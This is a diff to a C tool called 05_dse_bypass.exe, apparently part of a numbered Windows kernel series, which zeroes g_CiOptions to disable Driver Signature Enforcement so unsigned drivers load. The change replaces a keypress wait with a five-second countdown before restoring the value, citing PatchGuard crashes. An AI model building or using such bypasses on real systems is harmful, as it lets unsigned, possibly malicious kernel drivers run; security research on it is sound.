@@ -569,9 +569,13 @@ int main(int argc, char **argv)
         printf("\n[*] No test driver path given (or file not found).\n");
         printf("    Usage: 05_dse_bypass.exe C:\\path\\to\\unsigned.sys\n");
         printf("    DSE is now DISABLED — NtLoadDriver will accept unsigned drivers.\n");
-        printf("    Load your driver while g_CiOptions == 0, then we restore.\n");
-        printf("    Press Enter when done...\n");
-        getchar();
+        printf("\n[!] WARNING: PatchGuard (KPP) will BSOD the system if g_CiOptions\n");
+        printf("    stays zeroed too long (typically seconds to a few minutes).\n");
+        printf("    Auto-restoring in 5 seconds — load your driver NOW.\n");
+        for (int _i = 5; _i > 0; _i--) {
+            printf("    %d...\n", _i);
+            Sleep(1000);
+        }
     }
 
     // ── Step 10: RESTORE g_CiOptions ──────────────────────────────────────────
